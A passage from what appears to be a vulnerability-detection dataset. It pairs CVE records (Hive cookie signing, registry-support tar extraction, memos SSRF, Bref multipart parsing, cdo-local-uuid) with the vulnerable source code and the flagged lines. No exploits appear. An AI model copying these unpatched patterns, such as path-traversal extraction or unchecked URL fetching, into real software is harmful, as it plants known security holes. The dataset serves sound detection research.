currentSignature.getBytes())) {\n      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +\n        \" current = \" + currentSignature);\n    }\n    return rawValue;\n  }\n\n  /**\n   * Get the signature of the input string based on SHA digest algorithm.\n   * @param str Input token\n   * @return Signed String\n   */\n  private String getSignature(String str) {\n    try {\n      MessageDigest md = MessageDigest.getInstance(SHA_STRING);\n      md.update(str.getBytes());\n      md.update(secretBytes);\n      byte[] digest = md.digest();\n      return Base64.getEncoder().encodeToString(digest);\n    } catch (NoSuchAlgorithmException ex) {\n      throw new RuntimeException(\"Invalid SHA digest String: \" + SHA_STRING +\n        \" \" + ex.getMessage(), ex);\n    }\n  }\n}\n"
        },
        {
          "name": "service/src/test/org/apache/hive/service/TestCookieSigner.java",
          "content": "/*\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements.  See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership.  The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License.  You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\npackage org.apache.hive.service;\n\nimport static org.junit.Assert.assertEquals;\nimport static org.junit.Assert.assertTrue;\nimport static org.junit.Assert.fail;\n\nimport java.util.Random;\n\nimport org.junit.Before;\nimport org.junit.Test;\n\n/**\n * TestCookieSigner.\n *\n */\npublic class TestCookieSigner {\n  private static final Random RAN = new Random();\n\n  private CookieSigner cs;\n\n  @Before\n  public void setUp() {\n    cs = new CookieSigner(Long.toString(RAN.nextLong()).getBytes());\n  }\n\n  @Test\n  public void testVerifyAndExtract() {\n    String originalStr = \"cu=scott\";\n    String signedStr = cs.signCookie(originalStr);\n    assertEquals(originalStr, cs.verifyAndExtract(signedStr));\n  }\n\n  @Test\n  public void testVerifyAndExtractNoSignature() {\n    String originalStr = \"cu=scott\";\n    String signedStr = cs.signCookie(originalStr);\n    String modifedSignedStr = signedStr.replace(\"&s=\", \"\");\n    try {\n      cs.verifyAndExtract(modifedSignedStr);\n    } catch (IllegalArgumentException e) {\n      assertEquals(\"Invalid input sign: \" + modifedSignedStr, e.getMessage());\n      return;\n    }\n    fail(\"Expected IllegalArgumentException due to no signature\");\n  }\n\n  @Test\n  public void testVerifyAndExtractInvalidSignature() {\n    String originalStr = \"cu=scott\";\n    String signedStr = cs.signCookie(originalStr);\n    String modifedSignedStr = signedStr.replace(\"&s=\", \"&s=abc\");\n    try {\n      cs.verifyAndExtract(modifedSignedStr);\n    } catch (IllegalArgumentException e) {\n      assertTrue(e.getMessage().startsWith(\"Invalid sign, original = \"));\n      return;\n    }\n    fail(\"Expected IllegalArgumentException checking signature\");\n  }\n}\n"
        }
      ],
      "method_level": [
        "public String verifyAndExtract(String signedStr) {\n    int index = signedStr.lastIndexOf(SIGNATURE);\n    if (index == -1) {\n      throw new IllegalArgumentException(\"Invalid input sign: \" + signedStr);\n    }\n    String originalSignature = signedStr.substring(index + SIGNATURE.length());\n    String rawValue = signedStr.substring(0, index);\n    String currentSignature = getSignature(rawValue);\n\n    LOG.debug(\"Signature generated for {} inside verify is {}\", rawValue, currentSignature);\n    if (!MessageDigest.isEqual(originalSignature.getBytes(), currentSignature.getBytes())) {\n      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +\n        \" current = \" + currentSignature);\n    }\n    return rawValue;\n  }",
        "@Test\n  public void testVerifyAndExtractInvalidSignature() {\n    String originalStr = \"cu=scott\";\n    String signedStr = cs.signCookie(originalStr);\n    String modifedSignedStr = signedStr.replace(\"&s=\", \"&s=abc\");\n    try {\n      cs.verifyAndExtract(modifedSignedStr);\n    } catch (IllegalArgumentException e) {\n      assertTrue(e.getMessage().startsWith(\"Invalid sign, original = \"));\n      return;\n    }\n    fail(\"Expected IllegalArgumentException checking signature\");\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 79,
          "content": "    LOG.debug(\"Signature generated for {} inside verify is {}\", rawValue, currentSignature);"
        },
        {
          "line_no": 81,
          "content": "      throw new IllegalArgumentException(\"Invalid sign, original = \" + originalSignature +"
        },
        {
          "line_no": 82,
          "content": "        \" current = \" + currentSignature);"
        },
        {
          "line_no": 73,
          "content": "      assertTrue(e.getMessage().startsWith(\"Invalid sign, original = \"));"
        }
      ]
    },
    "cwe": [
      "CWE-209"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.9,
    "cvss_version": 3.1
  },
  {
    "id": 286,
    "cve": "CVE-2024-1485",
    "description": "A flaw was found in the decompression function of registry-support. This issue can be triggered if an unauthenticated remote attacker tricks a user into parsing a devfile which uses the `parent` or `plugin` keywords. This could download a malicious archive and cause the cleanup process to overwrite or delete files outside of the archive, which should not be allowed.",
    "vulnerability": {
      "file_level": [
        {
          "name": "registry-library/library/util.go",
          "content": "//\n// Copyright Red Hat\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n\npackage library\n\nimport (\n\t\"archive/tar\"\n\t\"compress/gzip\"\n\t\"crypto/tls\"\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n\t\"path\"\n\t\"path/filepath\"\n\t\"regexp\"\n\t\"strings\"\n\t\"time\"\n\n\t\"github.com/hashicorp/go-multierror\"\n)\n\n// SplitVersionFromStack takes a stack/version tag and splits the stack name from the version\nfunc SplitVersionFromStack(stackWithVersion string) (string, string, error) {\n\tvar requestVersion string\n\tvar stack string\n\n\tif valid, err := ValidateStackVersionTag(stackWithVersion); !valid {\n\t\tif err != nil {\n\t\t\treturn \"\", \"\", err\n\t\t}\n\t\treturn \"\", \"\", fmt.Errorf(\"stack/version tag '%s' is malformed, use form '<stack>:<version>' or '<stack>'\",\n\t\t\tstackWithVersion)\n\t} else if strings.Contains(stackWithVersion, \":\") {\n\t\tpair := strings.Split(stackWithVersion, \":\")\n\t\tif len(pair) != 2 {\n\t\t\treturn \"\", \"\", fmt.Errorf(\"problem splitting stack/version pair from tag '%s', instead of a pair got a length of %d\",\n\t\t\t\tstackWithVersion, len(pair))\n\t\t}\n\n\t\tstack = pair[0]\n\t\trequestVersion = pair[1]\n\t} else {\n\t\tstack = stackWithVersion\n\t\trequestVersion = \"\"\n\t}\n\n\treturn stack, requestVersion, nil\n}\n\n// ValidateStackVersionTag returns true if stack/version tag is well formed\n// and false if it is malformed\nfunc ValidateStackVersionTag(stackWithVersion string) (bool, error) {\n\tconst exp = `^[a-z][^:\\s]*(:([a-z]|[0-9])[^:\\s]*)?$`\n\tr, err := regexp.Compile(exp)\n\tif err != nil {\n\t\treturn false, err\n\t}\n\n\treturn r.MatchString(stackWithVersion), nil\n}\n\n// decompress extracts the archive file\nfunc decompress(targetDir string, tarFile string, excludeFiles []string) error {\n\tvar returnedErr error\n\n\treader, err := os.Open(filepath.Clean(tarFile))\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tdefer func() {\n\t\tif err = reader.Close(); err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t}\n\t}()\n\n\tgzReader, err := gzip.NewReader(reader)\n\tif err != nil {\n\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\treturn returnedErr\n\t}\n\n\tdefer func() {\n\t\tif err = gzReader.Close(); err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t}\n\t}()\n\n\ttarReader := tar.NewReader(gzReader)\n\tfor {\n\t\theader, err := tarReader.Next()\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t} else if err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\treturn returnedErr\n\t\t}\n\t\tif isExcluded(header.Name, excludeFiles) {\n\t\t\tcontinue\n\t\t}\n\n\t\ttarget := path.Join(targetDir, filepath.Clean(header.Name))\n\t\tswitch header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\terr = os.MkdirAll(target, os.FileMode(header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\tcase tar.TypeReg:\n\t\t\t/* #nosec G304 -- target is produced using path.Join which cleans the dir path */\n\t\t\tw, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\t\t/* #nosec G110 -- starter projects are vetted before they are added to a registry.  Their contents can be seen before they are downloaded */\n\t\t\t_, err = io.Copy(w, tarReader)\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\t\terr = w.Close()\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\tdefault:\n\t\t\tlog.Printf(\"Unsupported type: %v\", header.Typeflag)\n\t\t}\n\t}\n\n\treturn nil\n}\n\nfunc isExcluded(name string, excludeFiles []string) bool {\n\tbasename := filepath.Base(name)\n\tfor _, excludeFile := range excludeFiles {\n\t\tif basename == excludeFile {\n\t\t\treturn true\n\t\t}\n\t}\n\treturn false\n}\n\n// setHeaders sets the request headers\nfunc setHeaders(headers *http.Header, options RegistryOptions) {\n\tt := options.Telemetry\n\tif t.User != \"\" {\n\t\theaders.Add(\"User\", t.User)\n\t}\n\tif t.Client != \"\" {\n\t\theaders.Add(\"Client\", t.Client)\n\t}\n\tif t.Locale != \"\" {\n\t\theaders.Add(\"Locale\", t.Locale)\n\t}\n}\n\n// getHTTPClient returns a new http client object\nfunc getHTTPClient(options RegistryOptions) *http.Client {\n\n\toverriddenTimeout := httpRequestResponseTimeout\n\ttimeout := options.HTTPTimeout\n\t//if value is invalid or unspecified, the default will be used\n\tif timeout != nil && *timeout > 0 {\n\t\t//convert timeout to seconds\n\t\toverriddenTimeout = time.Duration(*timeout) * time.Second\n\t}\n\n\treturn &http.Client{\n\t\tTransport: &http.Transport{\n\t\t\tProxy:                 http.ProxyFromEnvironment,\n\t\t\tResponseHeaderTimeout: overriddenTimeout,\n\t\t\t/*#nosec G402 -- documented user option for dev/test, not for prod use */\n\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: options.SkipTLSVerify},\n\t\t},\n\t\tTimeout: overriddenTimeout,\n\t}\n}\n"
        }
      ],
      "method_level": [
        "func decompress(targetDir string, tarFile string, excludeFiles []string) error {\n\tvar returnedErr error\n\n\treader, err := os.Open(filepath.Clean(tarFile))\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tdefer func() {\n\t\tif err = reader.Close(); err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t}\n\t}()\n\n\tgzReader, err := gzip.NewReader(reader)\n\tif err != nil {\n\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\treturn returnedErr\n\t}\n\n\tdefer func() {\n\t\tif err = gzReader.Close(); err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t}\n\t}()\n\n\ttarReader := tar.NewReader(gzReader)\n\tfor {\n\t\theader, err := tarReader.Next()\n\t\tif err == io.EOF {\n\t\t\tbreak\n\t\t} else if err != nil {\n\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\treturn returnedErr\n\t\t}\n\t\tif isExcluded(header.Name, excludeFiles) {\n\t\t\tcontinue\n\t\t}\n\n\t\ttarget := path.Join(targetDir, filepath.Clean(header.Name))\n\t\tswitch header.Typeflag {\n\t\tcase tar.TypeDir:\n\t\t\terr = os.MkdirAll(target, os.FileMode(header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\tcase tar.TypeReg:\n\t\t\t/* #nosec G304 -- target is produced using path.Join which cleans the dir path */\n\t\t\tw, err := os.OpenFile(target, os.O_CREATE|os.O_RDWR, os.FileMode(header.Mode))\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\t\t/* #nosec G110 -- starter projects are vetted before they are added to a registry.  Their contents can be seen before they are downloaded */\n\t\t\t_, err = io.Copy(w, tarReader)\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\t\terr = w.Close()\n\t\t\tif err != nil {\n\t\t\t\treturnedErr = multierror.Append(returnedErr, err)\n\t\t\t\treturn returnedErr\n\t\t\t}\n\t\tdefault:\n\t\t\tlog.Printf(\"Unsupported type: %v\", header.Typeflag)\n\t\t}\n\t}\n\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 116,
          "content": "\t\ttarget := path.Join(targetDir, filepath.Clean(header.Name))"
        },
        {
          "line_no": 125,
          "content": "\t\t\t/* #nosec G304 -- target is produced using path.Join which cleans the dir path */"
        }
      ]
    },
    "cwe": [
      "CWE-23",
      "CWE-22"
    ],
    "severity": "HIGH",
    "cvss_score": 8.0,
    "cvss_version": 3.1
  },
  {
    "id": 682,
    "cve": "CVE-2024-29028",
    "description": "memos is a privacy-first, lightweight note-taking service. In memos 0.13.2, an SSRF vulnerability exists at the /o/get/httpmeta that allows unauthenticated users to enumerate the internal network and receive limited html values in json form. This vulnerability is fixed in 0.16.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "api/v1/http_getter.go",
          "content": "package v1\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n\n\t\"github.com/labstack/echo/v4\"\n\n\tgetter \"github.com/usememos/memos/plugin/http-getter\"\n)\n\nfunc (*APIV1Service) registerGetterPublicRoutes(g *echo.Group) {\n\t// GET /get/httpmeta?url={url} - Get website meta.\n\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)\n\n\t// GET /get/image?url={url} - Get image.\n\tg.GET(\"/get/image\", GetImage)\n}\n\n// GetWebsiteMetadata godoc\n//\n//\t@Summary\tGet website metadata\n//\t@Tags\t\tget\n//\t@Produce\tjson\n//\t@Param\t\turl\tquery\t\tstring\t\t\ttrue\t\"Website URL\"\n//\t@Success\t200\t{object}\tgetter.HTMLMeta\t\"Extracted metadata\"\n//\t@Failure\t400\t{object}\tnil\t\t\t\t\"Missing website url | Wrong url\"\n//\t@Failure\t406\t{object}\tnil\t\t\t\t\"Failed to get website meta with url: %s\"\n//\t@Router\t\t/o/get/GetWebsiteMetadata [GET]\nfunc GetWebsiteMetadata(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\thtmlMeta, err := getter.GetHTMLMeta(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)\n\t}\n\treturn c.JSON(http.StatusOK, htmlMeta)\n}\n\n// GetImage godoc\n//\n//\t@Summary\tGet GetImage from URL\n//\t@Tags\t\tget\n//\t@Produce\tGetImage/*\n//\t@Param\t\turl\tquery\t\tstring\ttrue\t\"Image url\"\n//\t@Success\t200\t{object}\tnil\t\t\"Image\"\n//\t@Failure\t400\t{object}\tnil\t\t\"Missing GetImage url | Wrong url | Failed to get GetImage url: %s\"\n//\t@Failure\t500\t{object}\tnil\t\t\"Failed to write GetImage blob\"\n//\t@Router\t\t/o/get/GetImage [GET]\nfunc GetImage(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing image url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\timage, err := getter.GetImage(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, fmt.Sprintf(\"Failed to get image url: %s\", urlStr)).SetInternal(err)\n\t}\n\n\tc.Response().Writer.WriteHeader(http.StatusOK)\n\tc.Response().Writer.Header().Set(\"Content-Type\", image.Mediatype)\n\tc.Response().Writer.Header().Set(echo.HeaderCacheControl, \"max-age=31536000, immutable\")\n\tif _, err := c.Response().Writer.Write(image.Blob); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusInternalServerError, \"Failed to write image blob\").SetInternal(err)\n\t}\n\treturn nil\n}\n"
        }
      ],
      "method_level": [
        "func (*APIV1Service) registerGetterPublicRoutes(g *echo.Group) {\n\t// GET /get/httpmeta?url={url} - Get website meta.\n\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)\n\n\t// GET /get/image?url={url} - Get image.\n\tg.GET(\"/get/image\", GetImage)\n}",
        "func GetWebsiteMetadata(c echo.Context) error {\n\turlStr := c.QueryParam(\"url\")\n\tif urlStr == \"\" {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")\n\t}\n\tif _, err := url.Parse(urlStr); err != nil {\n\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)\n\t}\n\n\thtmlMeta, err := getter.GetHTMLMeta(urlStr)\n\tif err != nil {\n\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)\n\t}\n\treturn c.JSON(http.StatusOK, htmlMeta)\n}"
      ],
      "hunk_level": [
        {
          "line_no": 14,
          "content": "\t// GET /get/httpmeta?url={url} - Get website meta."
        },
        {
          "line_no": 15,
          "content": "\tg.GET(\"/get/httpmeta\", GetWebsiteMetadata)"
        },
        {
          "line_no": 31,
          "content": "func GetWebsiteMetadata(c echo.Context) error {"
        },
        {
          "line_no": 32,
          "content": "\turlStr := c.QueryParam(\"url\")"
        },
        {
          "line_no": 33,
          "content": "\tif urlStr == \"\" {"
        },
        {
          "line_no": 34,
          "content": "\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Missing website url\")"
        },
        {
          "line_no": 35,
          "content": "\t}"
        },
        {
          "line_no": 36,
          "content": "\tif _, err := url.Parse(urlStr); err != nil {"
        },
        {
          "line_no": 37,
          "content": "\t\treturn echo.NewHTTPError(http.StatusBadRequest, \"Wrong url\").SetInternal(err)"
        },
        {
          "line_no": 38,
          "content": "\t}"
        },
        {
          "line_no": 40,
          "content": "\thtmlMeta, err := getter.GetHTMLMeta(urlStr)"
        },
        {
          "line_no": 41,
          "content": "\tif err != nil {"
        },
        {
          "line_no": 42,
          "content": "\t\treturn echo.NewHTTPError(http.StatusNotAcceptable, fmt.Sprintf(\"Failed to get website meta with url: %s\", urlStr)).SetInternal(err)"
        },
        {
          "line_no": 43,
          "content": "\t}"
        },
        {
          "line_no": 44,
          "content": "\treturn c.JSON(http.StatusOK, htmlMeta)"
        },
        {
          "line_no": 45,
          "content": "}"
        }
      ]
    },
    "cwe": [
      "CWE-918"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.8,
    "cvss_version": 3.1
  },
  {
    "id": 206,
    "cve": "CVE-2024-24754",
    "description": "Bref enable serverless PHP on AWS Lambda. When Bref is used with the Event-Driven Function runtime and the handler is a `RequestHandlerInterface`, then the Lambda event is converted to a PSR7 object. During the conversion process, if the request is a MultiPart, each part is parsed and its content added in the `$files` or `$parsedBody` arrays. The conversion process produces a different output compared to the one of plain PHP when keys ending with and open square bracket ([) are used. Based on the application logic the difference in the body parsing might lead to vulnerabilities and/or undefined behaviors. This vulnerability is patched in 2.1.13.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Event/Http/Psr7Bridge.php",
          "content": "<?php declare(strict_types=1);\n\nnamespace Bref\\Event\\Http;\n\nuse Bref\\Context\\Context;\nuse Nyholm\\Psr7\\ServerRequest;\nuse Nyholm\\Psr7\\Stream;\nuse Nyholm\\Psr7\\UploadedFile;\nuse Psr\\Http\\Message\\ResponseInterface;\nuse Psr\\Http\\Message\\ServerRequestInterface;\nuse Riverline\\MultiPartParser\\Part;\nuse RuntimeException;\n\nuse function str_starts_with;\n\n/**\n * Bridges PSR-7 requests and responses with API Gateway or ALB event/response formats.\n */\nfinal class Psr7Bridge\n{\n    /**\n     * Create a PSR-7 server request from an AWS Lambda HTTP event.\n     */\n    public static function convertRequest(HttpRequestEvent $event, Context $context): ServerRequestInterface\n    {\n        $headers = $event->getHeaders();\n\n        [$files, $parsedBody] = self::parseBodyAndUploadedFiles($event);\n        [$user, $password] = $event->getBasicAuthCredentials();\n\n        $server = array_filter([\n            'CONTENT_LENGTH' => $headers['content-length'][0] ?? null,\n            'CONTENT_TYPE' => $event->getContentType(),\n            'DOCUMENT_ROOT' => getcwd(),\n            'QUERY_STRING' => $event->getQueryString(),\n            'REQUEST_METHOD' => $event->getMethod(),\n            'SERVER_NAME' => $event->getServerName(),\n            'SERVER_PORT' => $event->getServerPort(),\n            'SERVER_PROTOCOL' => $event->getProtocol(),\n            'PATH_INFO' => $event->getPath(),\n            'HTTP_HOST' => $headers['host'] ?? null,\n            'REMOTE_ADDR' => $event->getSourceIp(),\n            'REMOTE_PORT' => $event->getRemotePort(),\n            'REQUEST_TIME' => time(),\n            'REQUEST_TIME_FLOAT' => microtime(true),\n            'REQUEST_URI' => $event->getUri(),\n            'PHP_AUTH_USER' => $user,\n            'PHP_AUTH_PW' => $password,\n        ]);\n\n        foreach ($headers as $name => $values) {\n            $server['HTTP_' . strtoupper(str_replace('-', '_', (string) $name))] = $values[0];\n        }\n\n        /**\n         * Nyholm/psr7 does not rewind body streams, we do it manually\n         * so that users can fetch the content of the body directly.\n         */\n        $bodyStream = Stream::create($event->getBody());\n        $bodyStream->rewind();\n\n        $request = new ServerRequest(\n            $event->getMethod(),\n            $event->getUri(),\n            $event->getHeaders(),\n            $bodyStream,\n            $event->getProtocolVersion(),\n            $server\n        );\n\n        foreach ($event->getPathParameters() as $key => $value) {\n            $request = $request->withAttribute($key, $value);\n        }\n\n        return $request->withUploadedFiles($files)\n            ->withCookieParams($event->getCookies())\n            ->withQueryParams($event->getQueryParameters())\n            ->withParsedBody($parsedBody)\n            ->withAttribute('lambda-event', $event)\n            ->withAttribute('lambda-context', $context);\n    }\n\n    /**\n     * Create a ALB/API Gateway response from a PSR-7 response.\n     */\n    public static function convertResponse(ResponseInterface $response): HttpResponse\n    {\n        $response->getBody()->rewind();\n        $body = $response->getBody()->getContents();\n\n        return new HttpResponse($body, $response->getHeaders(), $response->getStatusCode());\n    }\n\n    private static function parseBodyAndUploadedFiles(HttpRequestEvent $event): array\n    {\n        $bodyString = $event->getBody();\n        $files = [];\n        $parsedBody = null;\n        $contentType = $event->getContentType();\n        if ($contentType !== null && $event->getMethod() === 'POST') {\n            if (str_starts_with($contentType, 'application/x-www-form-urlencoded')) {\n                parse_str($bodyString, $parsedBody);\n            } else {\n                $document = new Part(\"Content-type: $contentType\\r\\n\\r\\n\" . $bodyString);\n                if ($document->isMultiPart()) {\n                    $parsedBody = [];\n                    foreach ($document->getParts() as $part) {\n                        if ($part->isFile()) {\n                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');\n                            if ($tmpPath === false) {\n                                throw new RuntimeException('Unable to create a temporary directory');\n                            }\n                            file_put_contents($tmpPath, $part->getBody());\n                            $file = new UploadedFile($tmpPath, filesize($tmpPath), UPLOAD_ERR_OK, $part->getFileName(), $part->getMimeType());\n\n                            self::parseKeyAndInsertValueInArray($files, $part->getName(), $file);\n                        } else {\n                            self::parseKeyAndInsertValueInArray($parsedBody, $part->getName(), $part->getBody());\n                        }\n                    }\n                }\n            }\n        }\n        return [$files, $parsedBody];\n    }\n\n    /**\n     * Parse a string key like \"files[id_cards][jpg][]\" and do $array['files']['id_cards']['jpg'][] = $value\n     */\n    private static function parseKeyAndInsertValueInArray(array &$array, string $key, mixed $value): void\n    {\n        if (! str_contains($key, '[')) {\n            $array[$key] = $value;\n\n            return;\n        }\n\n        $parts = explode('[', $key); // files[id_cards][jpg][] => [ 'files',  'id_cards]', 'jpg]', ']' ]\n        $pointer = &$array;\n\n        foreach ($parts as $k => $part) {\n            if ($k === 0) {\n                $pointer = &$pointer[$part];\n\n                continue;\n            }\n\n            // Skip two special cases:\n            // [[ in the key produces empty string\n            // [test : starts with [ but does not end with ]\n            if ($part === '' || ! str_ends_with($part, ']')) {\n                // Malformed key, we use it \"as is\"\n                $array[$key] = $value;\n\n                return;\n            }\n\n            $part = substr($part, 0, -1); // The last char is a ] => remove it to have the real key\n\n            if ($part === '') { // [] case\n                $pointer = &$pointer[];\n            } else {\n                $pointer = &$pointer[$part];\n            }\n        }\n\n        $pointer = $value;\n    }\n}\n"
        }
      ],
      "method_level": [
        "private static function parseBodyAndUploadedFiles(HttpRequestEvent $event): array\n    {\n        $bodyString = $event->getBody();\n        $files = [];\n        $parsedBody = null;\n        $contentType = $event->getContentType();\n        if ($contentType !== null && $event->getMethod() === 'POST') {\n            if (str_starts_with($contentType, 'application/x-www-form-urlencoded')) {\n                parse_str($bodyString, $parsedBody);\n            } else {\n                $document = new Part(\"Content-type: $contentType\\r\\n\\r\\n\" . $bodyString);\n                if ($document->isMultiPart()) {\n                    $parsedBody = [];\n                    foreach ($document->getParts() as $part) {\n                        if ($part->isFile()) {\n                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');\n                            if ($tmpPath === false) {\n                                throw new RuntimeException('Unable to create a temporary directory');\n                            }\n                            file_put_contents($tmpPath, $part->getBody());\n                            $file = new UploadedFile($tmpPath, filesize($tmpPath), UPLOAD_ERR_OK, $part->getFileName(), $part->getMimeType());\n\n                            self::parseKeyAndInsertValueInArray($files, $part->getName(), $file);\n                        } else {\n                            self::parseKeyAndInsertValueInArray($parsedBody, $part->getName(), $part->getBody());\n                        }\n                    }\n                }\n            }\n        }\n        return [$files, $parsedBody];\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 109,
          "content": "                            $tmpPath = tempnam(sys_get_temp_dir(), 'bref_upload_');"
        }
      ]
    },
    "cwe": [
      "CWE-436"
    ],
    "severity": "LOW",
    "cvss_score": 3.7,
    "cvss_version": 3.1
  },
  {
    "id": 65,
    "cve": "CVE-2024-22194",
    "description": "cdo-local-uuid project provides a specialized UUID-generating function that can, on user request, cause a program to generate deterministic UUIDs. An information leakage vulnerability is present in `cdo-local-uuid` at version `0.4.0`, and in `case-utils` in unpatched versions (matching the pattern `0.x.0`) at and since `0.5.0`, before `0.15.0`. The vulnerability stems from a Python function, `cdo_local_uuid.local_uuid()`, and its original implementation `case_utils.local_uuid()`. ",
    "vulnerability": {
      "file_level": [
        {
          "name": "case_utils/local_uuid.py",
          "content": "#!/usr/bin/env python3\n\n# This software was developed at the National Institute of Standards\n# and Technology by employees of the Federal Government in the course\n# of their official duties. Pursuant to title 17 Section 105 of the\n# United States Code this software is not subject to copyright\n# protection and is in the public domain. NIST assumes no\n# responsibility whatsoever for its use by other parties, and makes\n# no guarantees, expressed or implied, about its quality,\n# reliability, or any other characteristic.\n#\n# We would appreciate acknowledgement if the software is used.\n\n\"\"\"\nThis library is a wrapper for uuid, provided to generate repeatable UUIDs if requested.\n\"\"\"\n\n__version__ = \"0.3.2\"\n\nimport logging\nimport os\nimport pathlib\nimport sys\nimport typing\nimport uuid\nimport warnings\n\nDEMO_UUID_BASE: typing.Optional[str] = None\n\nDEMO_UUID_COUNTER: int = 0\n\n_logger = logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up demo_uuid() to generate non-random UUIDs.  See demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid.demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = 